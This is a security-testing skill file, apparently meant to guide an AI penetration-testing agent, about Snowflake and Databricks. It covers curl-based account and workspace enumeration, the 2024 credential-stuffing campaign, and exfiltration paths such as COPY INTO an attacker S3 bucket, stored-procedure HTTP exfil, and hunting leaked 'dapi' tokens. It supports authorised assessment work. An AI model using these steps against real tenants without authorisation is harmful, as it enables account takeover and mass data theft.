---
name: snowflake_databricks
description: Snowflake and Databricks security testing covering credential/token abuse, the 2024 credential-stuffing campaign class, notebook execution boundaries, data exfiltration paths, and over-scoped service principal misconfiguration
---

# Snowflake & Databricks

Snowflake and Databricks are cloud-hosted data platforms where the attack surface is identity and authorization, not infrastructure exploitation — the provider manages the compute and storage layers, so findings center on credential abuse, OAuth/PAT misconfiguration, over-scoped service principals, and data exfiltration paths rather than OS-level RCE. This skill owns these platform-specific surfaces. It does not duplicate general OAuth/OIDC mechanics (see `authentication_jwt`), general credential exposure patterns (see `cryptographic_failures`), or secret-in-code scanning (see `information_disclosure`). Databricks notebooks execute arbitrary code by design — the authz boundary around who can run them and what they can reach is the finding.

## Attack Surface

**Snowflake**
- **Authentication:** username/password, SSO (SAML/OAuth), key-pair auth, OAuth client credentials, MFA (Duo — opt-in per user, enforceable at account/network-policy level)
- **Access control:** RBAC — roles (ACCOUNTADMIN, SYSADMIN, SECURITYADMIN, custom), grants on warehouses/databases/schemas/tables/stages
- **Network exposure:** `<account>.snowflakecomputing.com` — internet-reachable by default; network policies (IP allowlists) are opt-in
- **Data movement:** stages (internal/external), COPY INTO, Snowpipe, data sharing, external tables, UDFs (Java/Python/SQL), stored procedures (JavaScript/Snowpark)
- **Tokens/credentials at risk:** password, key-pair private key, OAuth refresh/access tokens, PATs (preview), connection strings in application configs

**Databricks**
- **Authentication:** PATs (Personal Access Tokens), OAuth (M2M and U2M), Azure AD/AWS IAM/GCP IAM federation, SCIM for user provisioning
- **Access control:** Unity Catalog (cross-workspace governance), workspace-level ACLs, cluster policies, table ACLs (legacy), instance profiles (AWS) / managed identities (Azure) for cloud-resource access
- **Network exposure:** `<workspace>.cloud.databricks.com` (AWS), `adb-<id>.azuredatabricks.net` (Azure), `<workspace>.gcp.databricks.com` (GCP) — internet-reachable by default unless private link is configured
- **Compute:** clusters (all-purpose, job, SQL warehouse), notebooks (Python/Scala/SQL/R), jobs, ML models, Delta Live Tables
- **Data movement:** DBFS, external locations (S3/ADLS/GCS), volumes, Unity Catalog external tables, MLflow model registry, Repos (git integration)

## Reconnaissance

**Snowflake fingerprinting**
```
# Account endpoint — the login page confirms Snowflake
curl -sI https://<account>.snowflakecomputing.com/console/login
# Response headers: x-snowflake-* headers, Snowflake login page

# SSO discovery — identify the IdP
curl -s 'https://<account>.snowflakecomputing.com/session/authenticator-request' \
  -H 'Content-Type: application/json' \
  -d '{"data":{"ACCOUNT_NAME":"<account>","LOGIN_NAME":"test@example.com"}}'
# Response reveals SSO type (SAML, OAuth, external_browser) and IdP URL

# Check if the account exists
curl -s 'https://<account>.snowflakecomputing.com/session/v1/login-request' \
  -H 'Content-Type: application/json' \
  -d '{"data":{"LOGIN_NAME":"nonexistent","PASSWORD":"x"}}' | jq .message
# Account-not-found vs auth-failed error differentiates valid accounts
```

**Databricks fingerprinting**
```
# Workspace login page
curl -sI https://<workspace>.cloud.databricks.com/
# Look for: Databricks login, SSO redirect, Azure AD login

# API probe (unauthenticated)
curl -s https://<workspace>.cloud.databricks.com/api/2.0/clusters/list
# 401/403 = workspace exists, auth required; 404 = not a valid workspace

# PAT-authenticated API probe
curl -s -H "Authorization: Bearer dapi..." https://<workspace>.cloud.databricks.com/api/2.0/clusters/list
```

## Key Vulnerabilities

### Snowflake Credential-Stuffing Campaign Class (2024)

In April–June 2024, threat actor UNC5537 (Mandiant tracking) compromised approximately 165 Snowflake customer instances by using credentials stolen from infostealer malware (Lumma, Redline, Racoon, Vidar). This was not a Snowflake platform vulnerability — the root cause was customer-side: credentials harvested from endpoints, reused across services, with no MFA enforcement.

Mandiant documented that 79.7% of targeted accounts had prior credential exposure. The attack pattern:
1. Credentials obtained from infostealer logs (dark-web markets, Telegram channels).
2. Login via `snowsql` or the Snowflake JDBC/ODBC driver using the stolen username/password.
3. No MFA — Snowflake MFA (Duo) is opt-in per user; account-level MFA enforcement was not available until after the campaign prompted Snowflake to add it.
4. Data exfiltration via `COPY INTO @~` (user stage) → `GET @~/<file>` to download, or `COPY INTO 's3://attacker-bucket/'` with attacker-controlled external-stage credentials.

**Assessment implication:** on any Snowflake engagement, the first check is MFA enforcement posture — `SHOW PARAMETERS LIKE 'REQUIRE_MFA' IN ACCOUNT` (if available), or review the network policy and user-level MFA enrollment. The absence of enforced MFA + internet-reachable login + password-only auth is the finding; credential stuffing is the demonstrated impact.

### Over-Scoped Service Principals and Roles

**Snowflake:**
- Service accounts with `ACCOUNTADMIN` or `SYSADMIN` role → full warehouse/database access.
- `SECURITYADMIN` role → create/modify users, roles, and grants → privilege escalation.
- Key-pair auth private keys stored in application configs, CI/CD secrets, or developer workstations → credential theft without MFA (key-pair auth bypasses MFA).
- OAuth client credentials with overly broad scopes → M2M tokens with admin-level access.

**Databricks:**
- PATs with workspace-admin scope → full cluster, notebook, and data access.
- Service principals with Unity Catalog `ALL PRIVILEGES` or cloud-provider admin roles → cross-workspace data access.
- Instance profiles (AWS) / managed identities (Azure) attached to clusters with over-scoped IAM policies → cloud-resource access beyond what the Databricks workspace needs (S3 bucket access, KMS key access, etc.).
- PAT lifetime: Databricks PATs do not expire by default unless a workspace admin configures a maximum lifetime policy. Long-lived PATs are a persistence primitive.

### Notebook and Compute Execution (Databricks)

Databricks notebooks execute arbitrary Python, Scala, SQL, and R code on cluster compute. This is by design — the security boundary is who can run them and what the cluster's IAM role can reach.

- **Notebook RCE as a finding:** any user with cluster-attach permission can execute arbitrary code on the cluster. The cluster's IAM role (instance profile on AWS, managed identity on Azure) determines what cloud resources that code can access. Over-scoped IAM → the notebook becomes a pivot to S3 buckets, databases, Key Vault secrets, or other cloud services.
- **Init scripts:** cluster init scripts run as root on every cluster node at startup. A user with cluster-create permission can configure init scripts that persist malicious code across cluster restarts.
- **Repos (git integration):** workspace users can clone repositories and execute code from them. A compromised repo → code execution on every cluster that runs notebooks from it.
- **MLflow model registry:** a registered model's `predict` function executes arbitrary code when the model is loaded for inference. A poisoned model in the registry → RCE on the inference cluster.

### Data Exfiltration Paths

**Snowflake:**
- `COPY INTO @~/<filename>` → file lands in the user's internal stage → `GET @~/<filename>` downloads it.
- `COPY INTO 's3://attacker-bucket/'` with attacker-provided credentials → direct exfil to external storage.
- Data Sharing: a compromised admin can create a share or listing that exposes databases to an attacker-controlled Snowflake account.
- External tables pointing to attacker-controlled cloud storage.
- Stored procedures (JavaScript/Snowpark Python) can make HTTP requests — exfil data over HTTPS to an attacker endpoint.

**Databricks:**
- Notebook code writes directly to external locations (S3, ADLS, GCS) via the cluster's IAM role.
- DBFS `dbutils.fs.cp` copies data to attacker-controlled storage.
- Unity Catalog external locations: a compromised storage credential or external location grants direct cloud-storage access.
- MLflow artifacts: experiment artifacts and model files stored in cloud storage accessible via the workspace's IAM role.

### CVE-2024-49194 — Databricks JDBC Driver JNDI Injection (CVSS 7.3)

Databricks JDBC driver versions before 2.6.40 are vulnerable to JNDI injection via the `krbJAASFile` connection parameter. An attacker who controls the JDBC connection string (e.g., via a configuration injection or a shared connection-string template) can trigger JNDI resolution → deserialization RCE on the client. This affects applications connecting TO Databricks, not the Databricks platform itself.

## Testing Methodology

1. **Enumerate exposure** — confirm `*.snowflakecomputing.com` or `*.cloud.databricks.com` is internet-reachable; check for network policies (Snowflake) or private link (Databricks).
2. **Credential check** — test leaked/provided credentials; for Snowflake, check if MFA is enforced or bypassed by key-pair auth.
3. **Role/privilege audit** — enumerate the authenticated user's roles (Snowflake: `SHOW GRANTS TO USER`; Databricks: API list workspace members/groups/service principals) and assess scope.
4. **Data inventory** — Snowflake: `SHOW DATABASES`/`SHOW SCHEMAS`/`SHOW TABLES`; Databricks: Unity Catalog `SHOW CATALOGS`/`SHOW SCHEMAS`/`SHOW TABLES`, or DBFS listing.
5. **Exfiltration path test** — confirm whether the authenticated user can create stages/external locations, run `COPY INTO`, or write to cloud storage.
6. **Compute audit (Databricks)** — list clusters, check attached IAM roles/managed identities, test notebook execution permissions, inspect init scripts.
7. **Service principal audit** — enumerate service principals, their roles/grants, and PAT/OAuth token lifetimes.
8. **Connector/driver audit** — check JDBC/ODBC driver versions (CVE-2024-49194); inspect connection strings in application configs for embedded credentials.

## Validation

1. Show the authenticated session (Snowflake `SELECT CURRENT_USER(), CURRENT_ROLE()`, Databricks API whoami) with the user and role.
2. MFA gap: show that password-only login succeeds without MFA challenge; show the MFA enforcement setting is disabled.
3. Over-scoped role: show the role's grants and a query or action that the role should not permit (e.g., `ACCOUNTADMIN` querying sensitive tables, Databricks admin listing all secrets).
4. Data access: show query results from a sensitive table (redact PII in the report but confirm it is accessible).
5. Exfiltration: show the `COPY INTO` or notebook write command and the data landing in the target location.

## False Positives

- **MFA enforced at account level** (Snowflake) — credential stuffing is mitigated; the credential-abuse finding does not apply unless key-pair auth bypasses MFA.
- **Network policy restricting access** (Snowflake) or **private link** (Databricks) — internet-facing login blocked; test from the allowed network range.
- **Role with minimal grants** — a low-privilege user who can see only their own schema is not a finding; the finding is when the role grants access beyond the user's business need.
- **Notebook execution by design** — Databricks notebooks are meant to run code; the finding is over-scoped IAM on the cluster or unauthorized users with cluster-attach permission, not notebook execution itself.
- **PATs with admin-configured short lifetime** — if PAT max lifetime is enforced and reasonable (e.g., 90 days), long-lived-PAT persistence does not apply.
- **Managed services auto-rotating credentials** — Snowflake and Databricks may rotate internal credentials automatically; confirm the credential in question is user-managed.

## Impact

- Mass data exfiltration — the 2024 Snowflake campaign demonstrated theft of hundreds of millions of records from major enterprises via stolen credentials alone.
- Cloud-resource pivot via over-scoped IAM (Databricks clusters) → access to S3 buckets, databases, Key Vault secrets, KMS keys beyond the data platform.
- Persistence via long-lived PATs (Databricks) or key-pair credentials (Snowflake) that survive password resets.
- Code execution on Databricks clusters via notebooks, init scripts, or poisoned MLflow models.
- Data poisoning: write access to tables, stages, or Delta Lake locations modifies analytical and ML training data.

## Pro Tips

1. Snowflake key-pair auth bypasses MFA — a leaked private key is equivalent to a password+MFA credential; look for `.pem`/`.p8` files in repos, CI/CD secrets, and developer machines.
2. `SHOW GRANTS TO ROLE <role>` in Snowflake reveals the full privilege tree; walk it from `ACCOUNTADMIN` down to identify over-scoped grants.
3. Databricks PAT tokens start with `dapi` — grep application configs, environment variables, CI/CD logs, and git history for this prefix.
4. Snowflake `QUERY_HISTORY` and `LOGIN_HISTORY` views (in `SNOWFLAKE.ACCOUNT_USAGE`) reveal recent queries and login sources — use them to identify other service accounts and their access patterns.
5. Unity Catalog's `INFORMATION_SCHEMA` exposes table and column metadata across workspaces — enumerate it for sensitive-data discovery.
6. Pair with `cryptographic_failures` for credential exposure, `authentication_jwt` for OAuth/SSO token validation, and `information_disclosure` for secret-in-code scanning.

## Summary

Snowflake and Databricks compromise follows the credential → role → data path, not the exploit → shell → pivot path of infrastructure targets. The 2024 Snowflake credential-stuffing campaign proved that password-only auth without MFA enforcement at scale leads to mass data theft from cloud data platforms. On Databricks, over-scoped IAM roles on clusters turn notebook execution into a cloud-resource pivot. Test the identity layer first — MFA enforcement, role scope, PAT/key-pair lifetime, and network restrictions — then prove the data-access and exfiltration paths.
